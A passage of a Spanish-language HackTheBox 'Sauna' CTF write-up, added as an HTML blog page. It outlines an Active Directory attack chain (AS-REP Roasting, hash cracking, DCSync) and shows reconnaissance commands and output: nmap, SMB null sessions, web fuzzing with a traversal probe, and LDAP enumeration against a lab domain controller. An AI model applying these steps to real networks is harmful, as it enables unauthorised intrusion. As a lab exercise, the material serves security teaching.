@@ -1,0 +1,1360 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>HackTheBox - Sauna (easy) | MiguelRega7 - blog</title>
+<meta name="generator" content="Jekyll v4.3.2" />
+<meta property="og:title" content="HackTheBox - Sauna (easy)" />
+<meta name="author" content="MiguelRega7" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Posts sobre resolución de CTFs y ciberseguridad." />
+<meta property="og:description" content="Posts sobre resolución de CTFs y ciberseguridad." />
+<link rel="canonical" href="http://localhost:4000/hackthebox/machines/easy/2024/04/03/sauna.html" />
+<meta property="og:url" content="http://localhost:4000/hackthebox/machines/easy/2024/04/03/sauna.html" />
+<meta property="og:site_name" content="MiguelRega7 - blog" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2024-04-03T00:00:00-06:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="HackTheBox - Sauna (easy)" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"MiguelRega7"},"dateModified":"2024-04-03T00:00:00-06:00","datePublished":"2024-04-03T00:00:00-06:00","description":"Posts sobre resolución de CTFs y ciberseguridad.","headline":"HackTheBox - Sauna (easy)","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/hackthebox/machines/easy/2024/04/03/sauna.html"},"url":"http://localhost:4000/hackthebox/machines/easy/2024/04/03/sauna.html"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" href="/assets/css/style.css"><link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="MiguelRega7 - blog" />
+</head>
+<body><header class="site-header">
+
+  <div class="wrapper"><a class="site-title" rel="author" href="/">MiguelRega7 - blog</a><nav class="site-nav">
+        <input type="checkbox" id="nav-trigger" class="nav-trigger" />
+        <label for="nav-trigger">
+          <span class="menu-icon">
+            <svg viewBox="0 0 18 15" width="18px" height="15px">
+              <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"/>
+            </svg>
+          </span>
+        </label>
+
+        <div class="trigger"><a class="page-link" href="/about/">About</a></div>
+      </nav></div>
+</header>
+<main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+
+  <header class="post-header">
+    <h1 class="post-title p-name" itemprop="name headline">HackTheBox - Sauna (easy)</h1>
+    <p class="post-meta"><time class="dt-published" datetime="2024-04-03T00:00:00-06:00" itemprop="datePublished">
+        Apr 3, 2024
+      </time></p>
+  </header>
+
+  <div class="post-content e-content" itemprop="articleBody">
+    <p align="center">
+<img src="https://labs.hackthebox.com/storage/avatars/f31d5d0264fadc267e7f38a9d7729d14.png" />
+</p>
+
+<ul>
+  <li>En este post estaremos resolviendo la maquina Sauna de la plataforma de Hackthebox donde estaremos tocando temas de Active Directory mediante un un script de Nmap podremos hacer un reconocimiento basico de Ldap donde encontremos un usuario y muchos mas usuarios en la pagina web que corre en el puerto 80 solo 2 de esos usuarios kerbrute nos lo dara como validos vamos a emplear un ASRepRoast para obtener el hash de un usuario y procederemos a crackearlo para conectarnos con evil-winrm ademas encontraremos otro usuario el cual vamos a ver una contraseña en texto claro para migrar a otro usuario para la escalada de privilegios haremos un DCSync Attack.</li>
+</ul>
+
+<p>⮕ Maquina Windows</p>
+
+<ul>
+  <li>Maquina Windows nos damos cuenta por el <code class="language-plaintext highlighter-rouge">ttl</code>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ ping <span class="nt">-c</span> 1 10.10.10.175
+PING 10.10.10.175 <span class="o">(</span>10.10.10.175<span class="o">)</span> 56<span class="o">(</span>84<span class="o">)</span> bytes of data.
+64 bytes from 10.10.10.175: <span class="nv">icmp_seq</span><span class="o">=</span>1 <span class="nv">ttl</span><span class="o">=</span>127 <span class="nb">time</span><span class="o">=</span>110 ms
+
+<span class="nt">---</span> 10.10.10.175 ping statistics <span class="nt">---</span>
+1 packets transmitted, 1 received, 0% packet loss, <span class="nb">time </span>0ms
+rtt min/avg/max/mdev <span class="o">=</span> 110.186/110.186/110.186/0.000 ms
+❯ whichSystem.py 10.10.10.175
+
+10.10.10.175 <span class="o">(</span>ttl -&gt; 127<span class="o">)</span>: Windows
+</code></pre></div></div>
+
+<h2 id="portscan">Portscan</h2>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ nmap <span class="nt">-sCV</span> <span class="nt">-p53</span>,80,88,135,139,389,3268,445,464,5985,49674,49696,636,9389 10.10.10.175 <span class="nt">-oN</span> targeted
+Starting Nmap 7.93 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2023-06-09 11:11 CST
+Nmap scan report <span class="k">for </span>10.10.10.175
+Host is up <span class="o">(</span>0.12s latency<span class="o">)</span><span class="nb">.</span>
+
+PORT      STATE    SERVICE       VERSION
+53/tcp    open     domain        Simple DNS Plus
+80/tcp    open     http          Microsoft IIS httpd 10.0
+|_http-server-header: Microsoft-IIS/10.0
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-title: Egotistical Bank :: Home
+88/tcp    open     kerberos-sec  Microsoft Windows Kerberos <span class="o">(</span>server <span class="nb">time</span>: 2023-06-10 00:12:04Z<span class="o">)</span>
+135/tcp   open     msrpc         Microsoft Windows RPC
+139/tcp   open     netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp   open     ldap          Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name<span class="o">)</span>
+445/tcp   open     microsoft-ds?
+464/tcp   open     kpasswd5?
+636/tcp   open     tcpwrapped
+3268/tcp  filtered globalcatLDAP
+5985/tcp  open     http          Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+9389/tcp  open     mc-nmf        .NET Message Framing
+49674/tcp open     msrpc         Microsoft Windows RPC
+49696/tcp open     msrpc         Microsoft Windows RPC
+Service Info: Host: SAUNA<span class="p">;</span> OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-time: 
+|   <span class="nb">date</span>: 2023-06-10T00:12:55
+|_  start_date: N/A
+|_clock-skew: 6h59m58s
+| smb2-security-mode: 
+|   311: 
+|_    Message signing enabled and required
+
+</code></pre></div></div>
+
+<h2 id="enumeracion">Enumeracion</h2>
+
+<ul>
+  <li>Vamos a comenzar usando <strong>crackmapexec</strong> para ver ante que estamos.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ crackmapexec smb 10.10.10.175
+SMB         10.10.10.175    445    SAUNA            <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 17763 x64 <span class="o">(</span>name:SAUNA<span class="o">)</span> <span class="o">(</span>domain:EGOTISTICAL-BANK.LOCAL<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
+</code></pre></div></div>
+
+<ul>
+  <li>Si tratamos de listas recursos compartidos a nivel de red por <strong>SMB</strong> empleando un <strong>Null Session</strong> por que no disponemos de credenciales vemos que no hay nada.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ smbclient <span class="nt">-L</span> 10.10.10.175 <span class="nt">-N</span>
+Anonymous login successful
+
+	Sharename       Type      Comment
+	<span class="nt">---------</span>       <span class="nt">----</span>      <span class="nt">-------</span>
+SMB1 disabled <span class="nt">--</span> no workgroup available
+❯ smbmap <span class="nt">-H</span> 10.10.10.175
+<span class="o">[</span>+] IP: 10.10.10.175:445	Name: 10.10.10.175                                      
+</code></pre></div></div>
+
+<ul>
+  <li>Ahora vamos a enumerar el puerto <strong>80</strong> que corre un servicio <strong>Web</strong>.</li>
+</ul>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">❯</span> <span class="n">whatweb</span> <span class="n">http</span><span class="ss">:/</span><span class="o">/</span><span class="mf">10.10</span><span class="o">.</span><span class="mf">10.175</span>
+<span class="n">http</span><span class="ss">:/</span><span class="o">/</span><span class="mf">10.10</span><span class="o">.</span><span class="mf">10.175</span> <span class="p">[</span><span class="mi">200</span> <span class="no">OK</span><span class="p">]</span> <span class="no">Bootstrap</span><span class="p">,</span> <span class="no">Country</span><span class="p">[</span><span class="no">RESERVED</span><span class="p">][</span><span class="no">ZZ</span><span class="p">],</span> <span class="no">Email</span><span class="p">[</span><span class="n">example</span><span class="vi">@email</span><span class="p">.</span><span class="nf">com</span><span class="p">,</span><span class="n">info</span><span class="vi">@example</span><span class="p">.</span><span class="nf">com</span><span class="p">],</span> <span class="no">HTML5</span><span class="p">,</span> <span class="no">HTTPServer</span><span class="p">[</span><span class="no">Microsoft</span><span class="o">-</span><span class="no">IIS</span><span class="o">/</span><span class="mf">10.0</span><span class="p">],</span> <span class="no">IP</span><span class="p">[</span><span class="mf">10.10</span><span class="o">.</span><span class="mf">10.175</span><span class="p">],</span> <span class="no">Microsoft</span><span class="o">-</span><span class="no">IIS</span><span class="p">[</span><span class="mf">10.0</span><span class="p">],</span> <span class="no">Script</span><span class="p">,</span> <span class="no">Title</span><span class="p">[</span><span class="no">Egotistical</span> <span class="no">Bank</span> <span class="o">::</span> <span class="no">Home</span><span class="p">]</span>
+</code></pre></div></div>
+
+<ul>
+  <li>Al parecer vemos que es un <strong>Banco</strong>.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/easy/sauna/web1.png" />
+</p>
+
+<ul>
+  <li>
+    <p>Vamos <strong>fuzzing</strong> para ver si hay alguna ruta de interés.</p>
+  </li>
+  <li>
+    <p>Pues bueno vamos a ver la ruta de <strong>about.html</strong>.</p>
+  </li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ dirsearch <span class="nt">-u</span> http://10.10.10.175
+
+  _|. _ _  _  _  _ _|_    v0.4.2
+ <span class="o">(</span>_||| _<span class="o">)</span> <span class="o">(</span>/_<span class="o">(</span>_|| <span class="o">(</span>_| <span class="o">)</span>
+
+Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10903
+
+Output File: /usr/lib/python3/dist-packages/dirsearch/reports/10.10.10.175/_23-06-09_11-17-34.txt
+
+Error Log: /usr/lib/python3/dist-packages/dirsearch/logs/errors-23-06-09_11-17-34.log
+
+Target: http://10.10.10.175/
+
+<span class="o">[</span>11:17:34] Starting: 
+<span class="o">[</span>11:17:35] 403 -  312B  - /%2e%2e//google.com
+<span class="o">[</span>11:17:58] 403 -  312B  - /<span class="se">\.</span>.<span class="se">\.</span>.<span class="se">\.</span>.<span class="se">\.</span>.<span class="se">\.</span>.<span class="se">\.</span>.<span class="se">\.</span>.<span class="se">\.</span>.<span class="se">\.</span>.<span class="se">\e</span>tc<span class="se">\p</span>asswd
+<span class="o">[</span>11:18:00] 200 -   30KB - /about.html
+<span class="o">[</span>11:18:27] 200 -   15KB - /contact.html
+<span class="o">[</span>11:18:28] 301 -  147B  - /css  -&gt;  http://10.10.10.175/css/
+<span class="o">[</span>11:18:36] 301 -  149B  - /fonts  -&gt;  http://10.10.10.175/fonts/
+<span class="o">[</span>11:18:39] 301 -  150B  - /images  -&gt;  http://10.10.10.175/images/
+<span class="o">[</span>11:18:39] 403 -    1KB - /images/
+<span class="o">[</span>11:18:40] 200 -   32KB - /index.html
+
+Task Completed
+</code></pre></div></div>
+
+<ul>
+  <li>Y bueno ya tenemos nombres de usuarios que al parecer son empleados del banco como el puerto de  <strong>kerberos</strong> esta abierto podemos añadirlos a una lista y ver con <strong>kerbrute</strong> si podemos hacer un <strong>ASREProastattack</strong> para solicitar un <strong>TGT</strong>, ya que se utiliza autenticacion Kerberos.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/easy/sauna/web3.png" />
+</p>
+
+<ul>
+  <li>Antes de hacer todo esto tenemos que agregar el dominio al <strong>/etc/hosts/</strong>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">echo</span> <span class="s2">"10.10.10.175 EGOTISTICAL-BANK.LOCAL"</span> | <span class="nb">sudo tee</span> <span class="nt">-a</span> /etc/hosts
+10.10.10.175 EGOTISTICAL-BANK.LOCAL
+❯ ping <span class="nt">-c</span> 1 EGOTISTICAL-BANK.LOCAL
+PING EGOTISTICAL-BANK.LOCAL <span class="o">(</span>10.10.10.175<span class="o">)</span> 56<span class="o">(</span>84<span class="o">)</span> bytes of data.
+64 bytes from EGOTISTICAL-BANK.LOCAL <span class="o">(</span>10.10.10.175<span class="o">)</span>: <span class="nv">icmp_seq</span><span class="o">=</span>1 <span class="nv">ttl</span><span class="o">=</span>127 <span class="nb">time</span><span class="o">=</span>113 ms
+
+<span class="nt">---</span> EGOTISTICAL-BANK.LOCAL ping statistics <span class="nt">---</span>
+1 packets transmitted, 1 received, 0% packet loss, <span class="nb">time </span>0ms
+rtt min/avg/max/mdev <span class="o">=</span> 113.225/113.225/113.225/0.000 ms
+
+</code></pre></div></div>
+
+<ul>
+  <li>
+    <p>El puerto de <strong>Ldap</strong> también esta abierto vamos a enumerarlo para ver si encontramos algo interesante o vamos directamente hacer lo antes mencionado <a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-ldap">https://book.hacktricks.xyz/network-services-pentesting/pentesting-ldap</a>.</p>
+  </li>
+  <li>
+    <p>Podemos aplicar esto para enumerar este servicio.</p>
+  </li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ nmap <span class="nt">-n</span> <span class="nt">-sV</span> <span class="nt">--script</span> <span class="s2">"ldap* and not brute"</span> 10.10.10.175
+Starting Nmap 7.93 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2023-06-09 11:31 CST
+Nmap scan report <span class="k">for </span>10.10.10.175
+Host is up <span class="o">(</span>0.17s latency<span class="o">)</span><span class="nb">.</span>
+Not shown: 990 filtered tcp ports <span class="o">(</span>no-response<span class="o">)</span>
+PORT    STATE SERVICE       VERSION
+53/tcp  open  domain        Simple DNS Plus
+80/tcp  open  http          Microsoft IIS httpd 10.0
+|_http-server-header: Microsoft-IIS/10.0
+88/tcp  open  kerberos-sec  Microsoft Windows Kerberos <span class="o">(</span>server <span class="nb">time</span>: 2023-06-10 00:32:07Z<span class="o">)</span>
+135/tcp open  msrpc         Microsoft Windows RPC
+139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp open  ldap          Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: EGOTISTICAL-BANK.LOCAL, Site: Default-First-Site-Name<span class="o">)</span>
+| ldap-rootdse: 
+| LDAP Results
+|   &lt;ROOT&gt;
+|       domainFunctionality: 7
+|       forestFunctionality: 7
+|       domainControllerFunctionality: 7
+|       rootDomainNamingContext: <span class="nv">DC</span><span class="o">=</span>EGOTISTICAL-BANK,DC<span class="o">=</span>LOCAL
+|       ldapServiceName: EGOTISTICAL-BANK.LOCAL:sauna<span class="nv">$@</span>EGOTISTICAL-BANK.LOCAL
+|       isGlobalCatalogReady: TRUE
+|       supportedSASLMechanisms: GSSAPI
+|       supportedSASLMechanisms: GSS-SPNEGO
+|       supportedSASLMechanisms: EXTERNAL
+|       supportedSASLMechanisms: DIGEST-MD5
+|       supportedLDAPVersion: 3
+|       supportedLDAPVersion: 2
+|       supportedLDAPPolicies: MaxPoolThreads
+|       supportedLDAPPolicies: MaxPercentDirSyncRequests
+|       supportedLDAPPolicies: MaxDatagramRecv
+|       supportedLDAPPolicies: MaxReceiveBuffer
+|       supportedLDAPPolicies: InitRecvTimeout
+|       supportedLDAPPolicies: MaxConnections
+|       supportedLDAPPolicies: MaxConnIdleTime
+|       supportedLDAPPolicies: MaxPageSize
+|       supportedLDAPPolicies: MaxBatchReturnMessages
+|       supportedLDAPPolicies: MaxQueryDuration
+|       supportedLDAPPolicies: MaxDirSyncDuration
+|       supportedLDAPPolicies: MaxTempTableSize
+|       supportedLDAPPolicies: MaxResultSetSize
+|       supportedLDAPPolicies: MinResultSets
+|       supportedLDAPPolicies: MaxResultSetsPerConn
+|       supportedLDAPPolicies: MaxNotificationPerConn
+|       supportedLDAPPolicies: MaxValRange
+|       supportedLDAPPolicies: MaxValRangeTransitive
+|       supportedLDAPPolicies: ThreadMemoryLimit
+|       supportedLDAPPolicies: SystemMemoryLimitPercent
+|       supportedControl: 1.2.840.113556.1.4.319
+|       supportedControl: 1.2.840.113556.1.4.801
+|       supportedControl: 1.2.840.113556.1.4.473
+|       supportedControl: 1.2.840.113556.1.4.528
+|       supportedControl: 1.2.840.113556.1.4.417
+|       supportedControl: 1.2.840.113556.1.4.619
+|       supportedControl: 1.2.840.113556.1.4.841
+|       supportedControl: 1.2.840.113556.1.4.529
+|       supportedControl: 1.2.840.113556.1.4.805
+|       supportedControl: 1.2.840.113556.1.4.521
+|       supportedControl: 1.2.840.113556.1.4.970
+|       supportedControl: 1.2.840.113556.1.4.1338
+|       supportedControl: 1.2.840.113556.1.4.474
+|       supportedControl: 1.2.840.113556.1.4.1339
+|       supportedControl: 1.2.840.113556.1.4.1340
+|       supportedControl: 1.2.840.113556.1.4.1413
+|       supportedControl: 2.16.840.1.113730.3.4.9
+|       supportedControl: 2.16.840.1.113730.3.4.10
+|       supportedControl: 1.2.840.113556.1.4.1504
+|       supportedControl: 1.2.840.113556.1.4.1852
+|       supportedControl: 1.2.840.113556.1.4.802
+|       supportedControl: 1.2.840.113556.1.4.1907
+|       supportedControl: 1.2.840.113556.1.4.1948
+|       supportedControl: 1.2.840.113556.1.4.1974
+|       supportedControl: 1.2.840.113556.1.4.1341
+|       supportedControl: 1.2.840.113556.1.4.2026
+|       supportedControl: 1.2.840.113556.1.4.2064
+|       supportedControl: 1.2.840.113556.1.4.2065
+|       supportedControl: 1.2.840.113556.1.4.2066
+|       supportedControl: 1.2.840.113556.1.4.2090
+|       supportedControl: 1.2.840.113556.1.4.2205
+|       supportedControl: 1.2.840.113556.1.4.2204
+|       supportedControl: 1.2.840.113556.1.4.2206
+|       supportedControl: 1.2.840.113556.1.4.2211
+|       supportedControl: 1.2.840.113556.1.4.2239
+|       supportedControl: 1.2.840.113556.1.4.2255
+|       supportedControl: 1.2.840.113556.1.4.2256
+|       supportedControl: 1.2.840.113556.1.4.2309
+|       supportedControl: 1.2.840.113556.1.4.2330
+|       supportedControl: 1.2.840.113556.1.4.2354
+|       supportedCapabilities: 1.2.840.113556.1.4.800
+|       supportedCapabilities: 1.2.840.113556.1.4.1670
+|       supportedCapabilities: 1.2.840.113556.1.4.1791
+|       supportedCapabilities: 1.2.840.113556.1.4.1935
+|       supportedCapabilities: 1.2.840.113556.1.4.2080
+|       supportedCapabilities: 1.2.840.113556.1.4.2237
+|       subschemaSubentry: <span class="nv">CN</span><span class="o">=</span>Aggregate,CN<span class="o">=</span>Schema,CN<span class="o">=</span>Configuration,DC<span class="o">=</span>EGOTISTICAL-BANK,DC<span class="o">=</span>LOCAL
+|       serverName: <span class="nv">CN</span><span class="o">=</span>SAUNA,CN<span class="o">=</span>Servers,CN<span class="o">=</span>Default-First-Site-Name,CN<span class="o">=</span>Sites,CN<span class="o">=</span>Configuration,DC<span class="o">=</span>EGOTISTICAL-BANK,DC<span class="o">=</span>LOCAL
+|       schemaNamingContext: <span class="nv">CN</span><span class="o">=</span>Schema,CN<span class="o">=</span>Configuration,DC<span class="o">=</span>EGOTISTICAL-BANK,DC<span class="o">=</span>LOCAL
+|       namingContexts: <span class="nv">DC</span><span class="o">=</span>EGOTISTICAL-BANK,DC<span class="o">=</span>LOCAL
+|       namingContexts: <span class="nv">CN</span><span class="o">=</span>Configuration,DC<span class="o">=</span>EGOTISTICAL-BANK,DC<span class="o">=</span>LOCAL
+|       namingContexts: <span class="nv">CN</span><span class="o">=</span>Schema,CN<span class="o">=</span>Configuration,DC<span class="o">=</span>EGOTISTICAL-BANK,DC<span class="o">=</span>LOCAL
+|       namingContexts: <span class="nv">DC</span><span class="o">=</span>DomainDnsZones,DC<span class="o">=</span>EGOTISTICAL-BANK,DC<span class="o">=</span>LOCAL
+|       namingContexts: <span class="nv">DC</span><span class="o">=</span>ForestDnsZones,DC<span class="o">=</span>EGOTISTICAL-BANK,DC<span class="o">=</span>LOCAL
+|       isSynchronized: TRUE
+|       highestCommittedUSN: 98378
+|       dsServiceName: <span class="nv">CN</span><span class="o">=</span>NTDS Settings,CN<span class="o">=</span>SAUNA,CN<span class="o">=</span>Servers,CN<span class="o">=</span>Default-First-Site-Name,CN<span class="o">=</span>Sites,CN<span class="o">=</span>Configuration,DC<span class="o">=</span>EGOTISTICAL-BANK,DC<span class="o">=</span>LOCAL
+|       dnsHostName: SAUNA.EGOTISTICAL-BANK.LOCAL
+|       defaultNamingContext: <span class="nv">DC</span><span class="o">=</span>EGOTISTICAL-BANK,DC<span class="o">=</span>LOCAL
+|       currentTime: 20230610003213.0Z
+|_      configurationNamingContext: <span class="nv">CN</span><span class="o">=</span>Configuration,DC<span class="o">=</span>EGOTISTICAL-BANK,DC<span class="o">=</span>LOCAL
+| ldap-search: 
+|   Context: <span class="nv">DC</span><span class="o">=</span>EGOTISTICAL-BANK,DC<span class="o">=</span>LOCAL
+|     dn: <span class="nv">DC</span><span class="o">=</span>EGOTISTICAL-BANK,DC<span class="o">=</span>LOCAL
+|         objectClass: top
+|         objectClass: domain
+|         objectClass: domainDNS
+|         distinguishedName: <span class="nv">DC</span><span class="o">=</span>EGOTISTICAL-BANK,DC<span class="o">=</span>LOCAL
+|         instanceType: 5
+|         whenCreated: 2020/01/23 05:44:25 UTC
+|         whenChanged: 2023/06/09 23:53:44 UTC
+|         subRefs: <span class="nv">DC</span><span class="o">=</span>ForestDnsZones,DC<span class="o">=</span>EGOTISTICAL-BANK,DC<span class="o">=</span>LOCAL
+|         subRefs: <span class="nv">DC</span><span class="o">=</span>DomainDnsZones,DC<span class="o">=</span>EGOTISTICAL-BANK,DC<span class="o">=</span>LOCAL
+|         subRefs: <span class="nv">CN</span><span class="o">=</span>Configuration,DC<span class="o">=</span>EGOTISTICAL-BANK,DC<span class="o">=</span>LOCAL
+|         uSNCreated: 4099
+|         dSASignature: <span class="se">\x</span>01<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00<span class="o">(</span><span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00@<span class="se">\x</span>BE<span class="se">\x</span>E0<span class="se">\x</span>B3<span class="se">\x</span>C6%<span class="se">\x</span>ECD<span class="se">\x</span>B2<span class="se">\x</span>B9<span class="se">\x</span>9F<span class="se">\x</span>F8<span class="se">\D\x</span>B2<span class="se">\x</span>EC
+|         uSNChanged: 98336
+|         name: EGOTISTICAL-BANK
+|         objectGUID: 504e6ec-c122-a143-93c0-cf487f83363
+|         replUpToDateVector: <span class="se">\x</span>02<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>06<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00F<span class="se">\x</span>C6<span class="se">\x</span>FFTH<span class="se">\x</span>85uJ<span class="se">\x</span>BF	<span class="se">\x</span>C2<span class="se">\x</span>D4<span class="se">\x</span>05j<span class="se">\x</span>E2<span class="se">\x</span>8F<span class="se">\x</span>16<span class="se">\x</span>80<span class="se">\x</span>01<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>87L<span class="se">\x</span>94<span class="se">\x</span>1A<span class="se">\x</span>03<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>AB<span class="se">\x</span>8C<span class="se">\x</span>EFx<span class="se">\x</span>D1I<span class="se">\x</span>85D<span class="se">\x</span>B2<span class="se">\x</span>C2<span class="se">\x</span>ED<span class="se">\x</span>9Ce<span class="se">\x</span>FE<span class="se">\x</span>AF<span class="se">\x</span>AD<span class="se">\x</span>0C<span class="se">\x</span>E0<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00<span class="o">(</span>8<span class="se">\x</span>FE<span class="se">\x</span>16<span class="se">\x</span>03<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>DC<span class="se">\x</span>D1T<span class="se">\x</span>81<span class="se">\x</span>F1a.B<span class="se">\x</span>B4D
+|         @	<span class="se">\x</span>E6<span class="se">\x</span>84u<span class="se">\x</span>15p<span class="se">\x</span>01<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>D4n<span class="se">\x</span>0F<span class="se">\x</span>17<span class="se">\x</span>03<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>FDZ<span class="se">\x</span>85<span class="se">\x</span>92F<span class="se">\x</span>DE^A<span class="se">\x</span>AAVnj@#<span class="se">\x</span>F6<span class="se">\x</span>0C<span class="se">\x</span>0B<span class="se">\x</span>D0<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>D0<span class="se">\x</span>F0
+|         <span class="se">\x</span>15<span class="se">\x</span>03<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>9B<span class="se">\x</span>F0<span class="se">\x</span>C5<span class="se">\x</span>9Fl<span class="se">\x</span>1D|E<span class="se">\x</span>8B<span class="se">\x</span>15<span class="se">\x</span>FA/<span class="se">\x</span>1A&gt;<span class="se">\x</span>13N<span class="se">\x</span>14<span class="sb">`</span><span class="se">\x</span>01<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>10<span class="se">\x</span>D5<span class="se">\x</span>00<span class="se">\x</span>17<span class="se">\x</span>03<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00@<span class="se">\x</span>BE<span class="se">\x</span>E0<span class="se">\x</span>B3<span class="se">\x</span>C6%<span class="se">\x</span>ECD<span class="se">\x</span>B2<span class="se">\x</span>B9<span class="se">\x</span>9F<span class="se">\x</span>F8<span class="se">\D\x</span>B2<span class="se">\x</span>EC	<span class="se">\x</span>B0<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>D4<span class="se">\x</span>04R<span class="se">\x</span>14<span class="se">\x</span>03<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00
+|         creationTime: 133308284249331308
+|         forceLogoff: <span class="nt">-9223372036854775808</span>
+|         lockoutDuration: <span class="nt">-18000000000</span>
+|         lockOutObservationWindow: <span class="nt">-18000000000</span>
+|         lockoutThreshold: 0
+|         maxPwdAge: <span class="nt">-36288000000000</span>
+|         minPwdAge: <span class="nt">-864000000000</span>
+|         minPwdLength: 7
+|         modifiedCountAtLastProm: 0
+|         nextRid: 1000
+|         pwdProperties: 1
+|         pwdHistoryLength: 24
+|         objectSid: 1-5-21-2966785786-3096785034-1186376766
+|         serverState: 1
+|         uASCompat: 1
+|         modifiedCount: 1
+|         auditingPolicy: <span class="se">\x</span>00<span class="se">\x</span>01
+|         nTMixedDomain: 0
+|         rIDManagerReference: <span class="nv">CN</span><span class="o">=</span>RID Manager<span class="nv">$,CN</span><span class="o">=</span>System,DC<span class="o">=</span>EGOTISTICAL-BANK,DC<span class="o">=</span>LOCAL
+|         fSMORoleOwner: <span class="nv">CN</span><span class="o">=</span>NTDS Settings,CN<span class="o">=</span>SAUNA,CN<span class="o">=</span>Servers,CN<span class="o">=</span>Default-First-Site-Name,CN<span class="o">=</span>Sites,CN<span class="o">=</span>Configuration,DC<span class="o">=</span>EGOTISTICAL-BANK,DC<span class="o">=</span>LOCAL
+|         systemFlags: <span class="nt">-1946157056</span>
